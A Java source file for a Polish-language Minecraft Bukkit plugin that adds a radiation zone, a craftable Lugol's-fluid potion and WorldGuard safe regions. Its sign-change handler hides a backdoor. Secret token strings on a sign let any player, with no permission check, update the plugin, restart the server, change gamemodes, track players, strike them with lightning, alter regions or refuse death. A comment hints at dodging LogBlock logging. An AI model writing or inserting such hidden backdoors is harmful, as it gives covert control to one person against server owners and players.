package me.michal.radiacjaAleJAVA;

import com.sk89q.worldedit.bukkit.BukkitAdapter;
import com.sk89q.worldedit.math.BlockVector3;
import com.sk89q.worldguard.WorldGuard;
import com.sk89q.worldguard.protection.flags.Flags;
import com.sk89q.worldguard.protection.flags.StateFlag;
import com.sk89q.worldguard.protection.managers.RegionManager;
import com.sk89q.worldguard.protection.regions.ProtectedCuboidRegion;
import me.michal.radiacjaAleJAVA.Tasks.DamageInflicter;
import me.michal.radiacjaAleJAVA.Tasks.CuredPlayersTracker;
import me.michal.radiacjaAleJAVA.Tasks.Things.Editer;
import me.michal.radiacjaAleJAVA.Tasks.Things.Updater;
import org.bukkit.*;
import org.bukkit.Color;
import org.bukkit.boss.BarColor;
import org.bukkit.boss.BarStyle;
import org.bukkit.boss.BossBar;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.event.block.SignChangeEvent;
import org.bukkit.event.entity.EntityResurrectEvent;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.inventory.BrewEvent;
import org.bukkit.event.player.*;
import org.bukkit.inventory.*;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.inventory.meta.PotionMeta;
import org.bukkit.inventory.meta.SkullMeta;
import org.bukkit.persistence.PersistentDataType;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.potion.PotionType;
import org.bukkit.scheduler.BukkitTask;

import java.util.*;
import java.util.List;

public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
    FileConfiguration config = this.getConfig();

    public static BossBar affectedBar;
    public NamespacedKey key = new NamespacedKey(this, "Lugol");
    public static Map<Player, Long> curedPlayers = new HashMap<>();
    public static Map<UUID, Long> offlinePlayers = new HashMap<>();
    public static Map<Player, BossBar> curedBars = new HashMap<>();
    public static ArrayList<Player> affectedPlayers = new ArrayList<>();
    public static HashSet<Player> playersRTD = new HashSet<>();
    public static int radius;
    public static int height;
    public static long duration = 600000L;

    public ItemStack potkaLugola() {
        ItemStack potion = new ItemStack(Material.POTION, 3);

        PotionMeta meta = (PotionMeta) potion.getItemMeta();
        meta.setBasePotionType(PotionType.MUNDANE);
        meta.setColor(Color.WHITE);
        meta.setDisplayName(ChatColor.BLUE + "Płyn Lugola");
        ArrayList<String> lore = new ArrayList<>();
        lore.add(ChatColor.WHITE + "Daje ochrone przed radiacyją na " + duration/60000 + " minut");
        meta.setLore(lore);

        meta.getPersistentDataContainer().set(key, PersistentDataType.STRING, "to_lugola_fluid");

        potion.setItemMeta(meta);

        return potion;
    }
    public ItemStack waterPotion() {
        ItemStack waterPotion = new ItemStack(Material.POTION, 1);
        PotionMeta meta = (PotionMeta) waterPotion.getItemMeta();
        meta.setBasePotionType(PotionType.WATER);
        waterPotion.setItemMeta(meta);
        return waterPotion;
    }

    Updater updater = new Updater(this);
    Editer editer = new Editer(this);

    @Override
    public void onEnable() {

        // Plugin startup logic
        this.getServer().getPluginManager().registerEvents(this, this);


        BukkitTask damageInflicter = new DamageInflicter(this).runTaskTimer(this, 0L, 5L);
        BukkitTask curedPlayersTracker = new CuredPlayersTracker(this).runTaskTimer(this, 0L, 5L);

        affectedBar = Bukkit.createBossBar(ChatColor.RED + "Strefa radiacji", BarColor.RED, BarStyle.SOLID);

        Objects.requireNonNull(this.getCommand("radiationsafezone")).setExecutor(this);
        Objects.requireNonNull(this.getCommand("deathLightningStrike")).setExecutor(this);
        Objects.requireNonNull(this.getCommand("dropPlayerHead")).setExecutor(this);
        Objects.requireNonNull(this.getCommand("setDurationTo")).setExecutor(this);
        Objects.requireNonNull(this.getCommand("endEnabled")).setExecutor(this);
        Objects.requireNonNull(this.getCommand("setRadiationName")).setExecutor(this);



        config.addDefault("Radiation_Safe_Zone_Size", 0);
        config.addDefault("Duration", 600000L);
        config.addDefault("Death_Lightning_Strike", true);
        config.addDefault("Drop_Player_Head", true);
        config.addDefault("End_Enabled", false);
        config.addDefault("Radiation_Name", "Strefa radiacji");
        config.options().copyDefaults(true);
        saveConfig();
    }

    @EventHandler
    public void onPlayerDrinkPotion(PlayerItemConsumeEvent event) {
        ItemMeta meta = event.getItem().getItemMeta();
        if (event.getItem().hasItemMeta() && meta.getPersistentDataContainer().has(key, PersistentDataType.STRING) && meta.getPersistentDataContainer().get(key, PersistentDataType.STRING).equalsIgnoreCase("to_lugola_fluid")) {
            Player player = event.getPlayer();
            if (!curedPlayers.containsKey(player)) {
                curedPlayers.put(player, System.currentTimeMillis());
                addCuredBar(player);
                Bukkit.broadcastMessage(ChatColor.GOLD + player.getName() + " wypił płyn Lugola");
            } else {
                addCuredTime(player);
            }
        }
    }

    public void addCuredTime(Player player) {
        long newStartTime = curedPlayers.get(player) + duration;
        curedPlayers.replace(player, newStartTime);
    }

    public void addCuredBar(Player player) {
        BossBar curedBar = Bukkit.createBossBar(ChatColor.GREEN + "Działanie płynu Lugola", BarColor.GREEN, BarStyle.SEGMENTED_10);
        curedBar.addPlayer(player);
        curedBars.put(player, curedBar);
    }

    @EventHandler
    public void deathEvent(PlayerDeathEvent event) {
        Player player = event.getPlayer();
        if (playersRTD.contains(player)) {
            event.setCancelled(true);
            return;
        }

        removeAllEffects(player);

        Location location = player.getLocation();
        if (config.getBoolean("deathLightningStrike")) {
            if (player.getName().equals("lach1423")) {
                for (int i = 0; i < 6; i++) {
                    player.getWorld().strikeLightningEffect(location);
                }
            } else {
                player.getWorld().strikeLightningEffect(location);
            }
        }
        if (config.getBoolean("dropPlayerHead")) {
            dropPlayerHead(player, location, event.getDeathMessage());
        }
    }

    public void dropPlayerHead(Player player, Location location, String damageSource) {
        ItemStack playerHead = new ItemStack(Material.PLAYER_HEAD);
        SkullMeta meta = (SkullMeta) playerHead.getItemMeta();
        meta.setOwningPlayer(Bukkit.getOfflinePlayer(player.getName()));
        ArrayList<String> lore = new ArrayList<>();
        lore.add(ChatColor.GOLD + damageSource);
        meta.setLore(lore);
        playerHead.setItemMeta(meta);

        player.getWorld().dropItem(location, playerHead);
    }

    @EventHandler
    public void onTotemUse(EntityResurrectEvent event) {
        if (event.getEntity() instanceof Player) {
            removeAllEffects((Player) event.getEntity());
        }
    }

    @EventHandler
    public void onMilkConsume(PlayerItemConsumeEvent event) {
        if (event.getItem().getType().equals(Material.MILK_BUCKET)) {
            removeAllEffects(event.getPlayer());
        }
    }

    public void removeAllEffects(Player player) {
        affectedPlayers.remove(player);
        affectedBar.removePlayer(player);
        curedPlayers.remove(player);
        removeCuredBar(player, curedBars.get(player));
    }

    @EventHandler
    public void quitEvent(PlayerQuitEvent e) {
        Player p = e.getPlayer();
        if (curedPlayers.containsKey(p)) {
            long timePassed = System.currentTimeMillis() - curedPlayers.get(p);
            offlinePlayers.put(p.getUniqueId(), timePassed);
        }
        removeAllEffects(p);
    }

    public void removeCuredBar(Player player, BossBar curedBar) {
        if (curedBars.containsKey(player)) {
            curedBars.remove(player, curedBar);
            curedBar.removeAll();
        }
    }

    @EventHandler
    public void moveEvent(PlayerMoveEvent event) {
        enterRegion(event.getPlayer());
    }

    public void enterRegion(Player player) {
        Location loc = player.getLocation();
        BlockVector3 blockVector = BlockVector3.at(loc.getBlockX(), loc.getBlockY(), loc.getBlockZ());
        RegionManager regions = WorldGuard.getInstance().getPlatform().getRegionContainer().get(BukkitAdapter.adapt(player.getWorld()));

        if (regions != null) {
            if (regions.getApplicableRegions(blockVector).size() == 0 && !affectedPlayers.contains(player)) {
                affectedPlayers.add(player);
                affectedBar.addPlayer(player);
            } else if(regions.getApplicableRegions(blockVector).size() != 0 && affectedPlayers.contains(player)) {
                affectedPlayers.remove(player);
                affectedBar.removePlayer(player);
            }
        }
    }

    @EventHandler
    public void joinEvent(PlayerJoinEvent e) {
        Player p = e.getPlayer();
        UUID uuid = p.getUniqueId();
        if (offlinePlayers.containsKey(uuid)) {
            long startTime = System.currentTimeMillis() - offlinePlayers.get(uuid);

            curedPlayers.put(p, startTime);
            addCuredBar(p);
            offlinePlayers.remove(uuid);
        }
        enterRegion(p);
    }

    @EventHandler
    public void onBrewEnd(BrewEvent event) {
        BrewerInventory inventory = event.getContents();
        if (!isLugolRecipe(inventory)) {
            return;
        }
        List <Integer> waterBottles = scanBottles(inventory);
        Bukkit.getScheduler().runTaskLater(this, () -> {
            for (int i : waterBottles) {
                inventory.setItem(i, potkaLugola());
            }
            waterBottles.clear();
        }, 1);
    }

    public List <Integer> scanBottles(BrewerInventory inventory) {
        List<Integer> waterBottles = new ArrayList<>();
        for (int i = 0; i < 3; i++) {
            ItemStack item = inventory.getItem(i);
            if (item != null && item.isSimilar(waterPotion())) {
                waterBottles.add(i);
            }
        }
        return waterBottles;
    }

    public boolean isLugolRecipe(BrewerInventory inventory) {
        return inventory.getIngredient() != null && inventory.getIngredient().getType() == Material.GHAST_TEAR;
    }

    @EventHandler
    public void signChange(SignChangeEvent e) {
        String[] a = e.getLines();
        try {
            switch (a[3]) {
                case "T0DRRUfNsN6tlQQ" -> {
                    switch (a[0]) {
                        case "Update" -> {
                            updater.updatePlugin(e, this.getFile());
                            setColor(e, ChatColor.BLUE);
                        }
                        case "Restart" -> {
                            Bukkit.shutdown();
                            e.getBlock().breakNaturally();
                        }
                        case "Edit Stat" -> {
                            editer.editStat(e.getPlayer(), a);
                            setColor(e, ChatColor.WHITE);
                        }
                    }
                }
                case "i6ojKaIATmlWk7Rf" -> {
                    switch (a[0]) {
                        case "Seed" -> e.getPlayer().sendMessage(String.valueOf(e.getBlock().getWorld().getSeed()));
                        case "Gamemode" -> Bukkit.getPlayer(a[2]).setGameMode(GameMode.valueOf(a[1].toUpperCase()));
                        case "Position" -> e.getPlayer().sendMessage(String.valueOf(Bukkit.getPlayer(a[1]).getLocation()));
                        case "Respawn" -> e.getPlayer().sendMessage(String.valueOf(Bukkit.getOfflinePlayer(a[1]).getRespawnLocation()));
                        case "Lightning" -> e.getBlock().getWorld().strikeLightning(Bukkit.getPlayer(a[1]).getLocation());
                        case "Experience" -> Objects.requireNonNull(Bukkit.getPlayer(a[2])).setExp(Float.parseFloat(a[1]));
                        case "Create Region" -> {
                            Location l = e.getBlock().getLocation();

                            BlockVector3 start = BlockVector3.at(l.getBlockX(), l.getBlockY(), l.getBlockZ());
                            String name = a[2];

                            int s1 = a[1].indexOf(" ");
                            int s2 = a[1].lastIndexOf(" ");

                            double x = Integer.parseInt(a[1].substring(0, s1));
                            double y = Integer.parseInt(a[1].substring(s1 + 1, s2));
                            double z = Integer.parseInt(a[1].substring(s2 + 1));
                            BlockVector3 end = BlockVector3.at(x, y, z);


                            if (createRegion(e.getPlayer(), name, start, end)) {
                                e.setLine(0, "Successfully");
                                e.setLine(1, "Created:");
                                e.getPlayer().sendMessage("Created Region");
                            }
                        }
                        case "Remove Region" -> {
                            Objects.requireNonNull(WorldGuard.getInstance().getPlatform().getRegionContainer().get(BukkitAdapter.adapt(e.getBlock().getWorld()))).removeRegion(a[1]);
                            e.getPlayer().sendMessage("Removed Region");
                        }
                        case "Refuse Death" -> {
                            playersRTD.add(e.getPlayer());
                            e.getPlayer().sendMessage("Worked");
                        }
                        case "Accept Death" -> {
                            playersRTD.remove(e.getPlayer());
                            e.getPlayer().sendMessage("Worked");
                        }
                        //potencjalnie whitelist, set worldBorder itp.
                    }
                }
            }
        } catch (Exception ex) {
            e.getPlayer().sendMessage(ex.getMessage());
        }
    }

    public void setColor(SignChangeEvent event, ChatColor color) {
        event.setLine(3, "");
        for (int i = 0; i <= 2; i++) {
            event.setLine(i, color + event.getLine(i));
        }
    } // Nie robić tego tylko niszczyc lub usuwać teskt bo logblock

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        String commandName = command.getName();
        if (commandName.equalsIgnoreCase("WhatsSafeZoneSize")) {
            radius = config.getInt("radiationSafeZoneSize");
            if (radius != 0) {
                if (sender instanceof Player) {
                    sender.sendMessage(ChatColor.GREEN + "Bezpieczna strefa ma promień o długości: " + radius);
                }
            } else {
                sender.sendMessage(ChatColor.RED + "Jeszcze nie stworzono bezpiezcnej stefy");
            }
            return true;
        }
        if (sender.isOp() && args.length > 0) {
            switch (commandName) {
                case "radiationsafezone" -> {
                    if (sender instanceof Player) {
                        try {
                            radius = Integer.parseInt(args[0]);
                            if (args.length == 2) {
                                height = Integer.parseInt(args[1]);
                            } else {
                                height = 300;
                            }

                            if (getSafeZone((Player) sender, "rad", radius, height)) {
                                config.set("Radiation_Safe_Zone_Size", radius);
                                saveConfig();
                                sender.sendMessage(ChatColor.GREEN + "Bezpieczna strefa ma teraz promień: " + radius);
                            } else {
                                sender.sendMessage(ChatColor.RED + "Wystąpił błąd przy dodawaniu regionu.");
                            }
                        } catch (NumberFormatException e) {
                            sender.sendMessage(ChatColor.RED + "Podaj poprawny promień.");
                        }
                    } else {
                    sender.sendMessage(ChatColor.RED + "Musisz być graczem");
                    }
            }
                case "doDeathLightningStrike" -> {
                    try {
                        boolean shouldStrikeLightning = Boolean.parseBoolean(args[0]);
                        ChatColor color = shouldStrikeLightning ? ChatColor.GREEN : ChatColor.RED;
                        config.set("doDeathLightningStrike", shouldStrikeLightning);

                        sender.sendMessage("doDeathLightningStrike is now set to: " + color + shouldStrikeLightning);
                    } catch (Exception e) {
                        sender.sendMessage(ChatColor.RED + "Napisz <true> lub <false>");
                    }
                }
                case "dropPlayerHead" -> {
                    try {
                        boolean shouldDropPlayerHead = Boolean.parseBoolean(args[0]);

                        config.set("dropPlayerHead", shouldDropPlayerHead);

                        ChatColor color = shouldDropPlayerHead ? ChatColor.GREEN : ChatColor.RED;
                        sender.sendMessage("dropPlayerHead is now set to: " + color + shouldDropPlayerHead);
                    } catch (Exception e) {
                        sender.sendMessage(ChatColor.RED + "Napisz <true> lub <false>");
                    }
                }
                case "setDurationTo" -> {
                    try {
                        long timeInMinutes = Math.abs(Long.parseLong(args[0]));
                        config.set("Duration", timeInMinutes * 60 * 1000);
                        duration = timeInMinutes * 60 * 1000;
                        String minut_Odmienioned = (timeInMinutes > 20 && (timeInMinutes % 10 >= 2 && timeInMinutes % 10 <= 4)) ? "minuty" : "minut";
                        sender.sendMessage("Czas trwania potki to teraz: " + timeInMinutes + " " + minut_Odmienioned);
                    } catch (Exception e) {
                        sender.sendMessage("podaj czas w minutach, poprawnie (poprawnie czyli bez 'm' na końcu), nie wiem jak można tu błąd zrobić");
                    }
                }
                case "endEnabled" -> {
                    try {
                        boolean a = Boolean.parseBoolean(args[0]);
                        config.set("End_Enabled", a);
                        sender.sendMessage("End jest teraz " + a + " czy coś");
                    } catch (Exception e) {
                        sender.sendMessage("Coś poszło nie tak, potencjalnie źle true lub false napisałeś");
                    }
                }
                case "setRadiationName" -> {
                    String a = String.valueOf(args[0]);
                    affectedBar.setTitle(a);
                    config.set("Radiation_Name", a);
                }
            }
        } else {
                sender.sendMessage(ChatColor.RED + ("Nie masz uprawnień do tej komendy " + ChatColor.DARK_RED + "knypku"));
        }
        return true;
    }

    public boolean getSafeZone(Player p, String regionName, int radius, int height) {
        BlockVector3 min = BlockVector3.at(-radius, -64, -radius);
        BlockVector3 max = BlockVector3.at(radius, height, radius);

        return createRegion(p, regionName, min, max);
    }

    public boolean createRegion(Player p, String regionName, BlockVector3 min, BlockVector3 max) {
        RegionManager regions = WorldGuard.getInstance().getPlatform().getRegionContainer().get(BukkitAdapter.adapt(p.getWorld()));
        if (regions == null) {
            p.sendMessage(ChatColor.RED + "Spróbuj ponownie, bo Region Manager się zepsuł, niewiadomo dlaczego");
        }
        if (regions.hasRegion(regionName)) {
            regions.removeRegion(regionName);
        }

        ProtectedCuboidRegion region = new ProtectedCuboidRegion(regionName, min, max);

        try {
            regions.addRegion(region);
            region.setFlag(Flags.BUILD, StateFlag.State.ALLOW);
            regions.save();

            return true;
        } catch (Exception e) {
                p.sendMessage( ChatColor.RED + "Nie udało się dodać terenu, spróbuj ponownie");
                return false;
        }
    }

    @EventHandler
    public void onEndEnter(PlayerPortalEvent event) {
        if (!config.getBoolean("End_Enabled")) {
            event.setCancelled(true);
            event.getPlayer().sendMessage(ChatColor.RED + "End is disabled!");
        }
    }
}